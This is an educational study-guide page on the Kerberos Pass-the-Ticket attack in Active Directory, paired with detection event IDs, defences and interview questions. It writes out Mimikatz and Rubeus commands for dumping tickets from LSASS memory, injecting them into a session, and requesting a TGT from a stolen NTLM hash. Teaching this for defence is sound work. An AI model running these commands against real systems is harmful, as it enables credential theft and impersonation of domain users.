# 04 — Pass-the-Ticket (PtT)

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Protocol exploited:** Kerberos

---

## 📌 What is Pass-the-Ticket?

While Pass-the-Hash abuses NTLM, **Pass-the-Ticket** abuses Kerberos. Instead of stealing a password hash, an attacker steals a **Kerberos ticket** from memory and injects it into their own session to impersonate the victim.

> **Simple definition:**  
> Pass-the-Ticket steals a valid Kerberos ticket (TGT or service ticket) from a machine's memory and uses it from a different machine to access resources as the ticket's original owner.

---

## ⚙️ How It Works

```
Kerberos tickets are stored in LSASS memory while a user is logged in.
If an attacker can read LSASS memory → steal tickets → use anywhere.

Step 1: Identify target session
  klist ← list current tickets
  Rubeus.exe triage ← list all tickets on machine

Step 2: Extract tickets from LSASS
  Using Mimikatz:
  sekurlsa::tickets /export
  → Creates .kirbi files for each ticket:
    [0;3e4]-2-1-40e10000-GP@krbtgt-COMPANY.LOCAL.kirbi  ← GP's TGT!
    [0;3e4]-0-0-40a50000-GP@cifs-FileServer01.kirbi      ← Service ticket

  Using Rubeus:
  Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
  → Outputs base64-encoded ticket

Step 3: Inject ticket into attacker's session
  Mimikatz:
  kerberos::ptt [0;3e4]-2-1-40e10000-GP@krbtgt-COMPANY.LOCAL.kirbi

  Rubeus:
  Rubeus.exe ptt /ticket:[base64_ticket]

Step 4: Use the stolen ticket
  klist ← verify GP's ticket is now in attacker's session
  dir \\DC01\C$ ← access DC with GP's ticket ✅
  
  The attacker IS GP as far as Kerberos is concerned.
  No password. No hash. Just a stolen ticket.
```

### Over-Pass-the-Hash (Hybrid Attack)

```
Combines PtH + PtT — uses NTLM hash to request a Kerberos TGT.
More powerful because TGT can be used for Kerberos authentication
(bypasses environments where NTLM is restricted).

Rubeus.exe asktgt /user:GP /rc4:[NTLM_hash] /ptt
→ Requests a TGT for GP using her NTLM hash
→ Injects TGT into current session
→ Attacker now has Kerberos TGT as GP ✅
```

---

## 🔍 Detection

```
Event ID 4768 — TGT requested
Event ID 4769 — Service ticket requested
  Watch for:
  → TGT requests from machines where the user is NOT logged in
  → Service ticket requests for sensitive services from unexpected sources
  → Tickets appearing without corresponding 4768 events

Rubeus triage is noisy — many LSASS reads generate:
  Event ID 4656 — Handle to object requested (LSASS handle)
  Event ID 4663 — Object accessed

Defender for Identity:
  → "Pass-the-Ticket" alert
  → Detects ticket being used from a different IP than where it was issued
```

---

## 🛡️ Defence

```
1. Protected Users group
   → Reduces TGT lifetime to 4 hours (less time to abuse stolen ticket)
   → Prevents credential caching (tickets not cached on remote machines)

2. Credential Guard
   → Prevents ticket extraction from LSASS

3. Short ticket lifetimes
   GPO: Computer Config → Windows Settings → Security Settings
   → Account Policies → Kerberos Policy
   → Maximum lifetime for user ticket: 4 hours (default: 10)
   → Maximum lifetime for service ticket: 1 hour (default: 10)

4. Privileged Access Workstations
   → Admin tickets only on PAWs — attacker cannot reach PAWs
   → No admin tickets on compromisable workstations

5. Monitor for ticket injection
   → EDR tools detect Rubeus/Mimikatz ticket operations
   → Alert on LSASS handle requests from non-system processes
```

---

## 🎯 Key Interview Questions

**Q: What is the difference between Pass-the-Hash and Pass-the-Ticket?**  
**A:** PtH abuses NTLM — it steals the password hash and uses it in NTLM authentication. PtT abuses Kerberos — it steals a Kerberos ticket (TGT or service ticket) from memory and injects it into another session. PtH targets the hash in LSASS. PtT targets the ticket cache in LSASS. Both require LSASS access, but they exploit different authentication protocols.

**Q: How does the Protected Users group reduce Pass-the-Ticket risk?**  
**A:** Protected Users reduces TGT lifetime to 4 hours (from 10) and prevents ticket renewal — limiting the window a stolen ticket remains valid. It also prevents credential caching, meaning Protected Users members' tickets are not stored on remote machines. An attacker who steals a Protected Users member's ticket has at most 4 hours to use it.

---

*"Kerberos tickets are the golden keys of Windows authentication. Protect them like credentials — because to Kerberos, they are credentials."*
